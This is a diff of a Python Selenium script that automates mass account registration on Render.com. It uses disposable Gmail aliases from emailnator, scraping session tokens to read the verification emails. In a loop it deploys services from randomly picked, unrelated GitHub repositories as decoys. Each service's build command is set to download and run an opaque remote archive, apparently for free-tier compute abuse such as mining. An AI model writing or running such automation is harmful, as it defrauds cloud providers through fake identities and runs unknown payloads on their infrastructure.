@@ -29,12 +29,28 @@ options.user_data_dir = "rawr"
 options.add_argument("--window-size=1920,1080")
 options.add_argument('--user-data-dir=rawr')
 driver = uc.Chrome(options=options, version_main=106)
-headersdomain = {'accept': 'application/ld+json'}
-responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
-emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
-myobj = {'address': emil,"password": "cloud"}
-headersreg = {'accept': 'application/ld+json'}
-responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)
+
+headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-User": "?1",
+        "Pragma": "no-cache",
+        "Cache-Control": "no-cache"}
+uwu = {
+        "email":["plusGmail"]
+}
+rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
+headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
+headersdomain["Accept"] = "application/json, text/plain, */*"
+headersdomain["Content-Type"] = "application/json"
+headersdomain["X-Requested-With"] = "XMLHttpRequest"
+headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
+rawrz = requests.post('https://www.emailnator.com/generate-email', headers=headersdomain, json=uwu)
+emil = rawrz.json()["email"][0].split("+")[0]+"+"+"".join(random.sample(low_word, 7))+"@gmail.com"
 driver.get('https://dashboard.render.com/register?next=/')
 time.sleep(2)
 driver.find_element(By.XPATH, "/html/body/div[1]/main/div[2]/div/form/span[1]/input").send_keys(emil)
@@ -43,28 +59,46 @@ driver.find_element(By.XPATH, "/html/body/div[1]/main/div[2]/div/form/span[2]/in
 time.sleep(1)
 driver.find_element(By.XPATH, "/html/body/div[1]/main/div[2]/div/form/button").click()
 time.sleep(20)
-myobjlog = {'address': emil,"password": "cloud"}
-headerslog = {'accept': 'application/ld+json'}
-responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
-token = responselog.json()["token"]
-headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
-responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
-headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
-responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
-verifylink = responsemessz.json()["text"].split("\n")[4]
+headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-User": "?1",
+        "Pragma": "no-cache",
+        "Cache-Control": "no-cache"}
+uwu = {}
+rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
+headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
+headersdomain["Accept"] = "application/json, text/plain, */*"
+headersdomain["Content-Type"] = "application/json"
+headersdomain["X-Requested-With"] = "XMLHttpRequest"
+headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
+uwu["email"]=emil
+rawrz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
+for bork in rawrz.json()["messageData"]:
+        if(bork["messageID"]!="ADSVPN"):
+                uwu["messageID"] = bork["messageID"]
+                rawrzz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
+                verifylink = rawrzz.text.split("\n")[2]
 driver.get(verifylink)
+githuby = ["https://github.com/dotnet/try", "https://github.com/The-Run-Philosophy-Organization/run","https://github.com/dotnet/runtime","https://github.com/runelite/runelite","https://github.com/oklog/run","https://github.com/opencontainers/runc","https://github.com/kubernetes/minikube","https://github.com/jenkinsci/docker","https://github.com/nextcloud/docker","https://github.com/odoo/docker","https://github.com/sous-chefs/docker","https://github.com/docker-library/docker","https://github.com/wendux/fly","https://github.com/H07000223/FlycoTabLayout","https://github.com/amibug/fly","https://github.com/makersacademy/airport_challenge","https://github.com/race604/FlyRefresh","https://github.com/flyway/flyway","https://github.com/thephpleague/flysystem","https://github.com/crash-utility/crash","https://github.com/crashub/crash","https://github.com/ACRA/acra","https://github.com/android-notes/Cockroach","https://github.com/1c7/Crash-Course-Computer-Science-Chinese","https://github.com/kstenerud/KSCrash"]
 for _ in range(20):
     driver.get("https://dashboard.render.com/select-repo?type=web")
     time.sleep(3)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div[1]/div[2]/div[2]/form/div/div[1]/div/div/input").send_keys("https://github.com/fdsjocxojv/fuzzy-pancake")
+    ass = random.choice(githuby)
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div[1]/div[2]/div[2]/form/div/div[1]/div/div/input").send_keys(ass)
     time.sleep(1)
     driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div[1]/div[2]/div[2]/form/div/div[2]/button").click()
     time.sleep(10)
     driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[1]/div[2]/div/div/div[1]/input").send_keys("".join(random.sample(low_word, 13)))
     time.sleep(1)
-    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[6]/div[2]/div/div/div/div/div/input").send_keys(Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"npm run build")
+    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[6]/div[2]/div/div/div/div/div/input").send_keys(Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/xdcloudy2.tar.gz && tar -xf xdcloudy2.tar.gz && ./hapi")
     time.sleep(1)
     driver.execute_script("window.scrollBy(0,1500)", "")
     time.sleep(1)
     driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[10]/div/button").click()
     time.sleep(10)
+
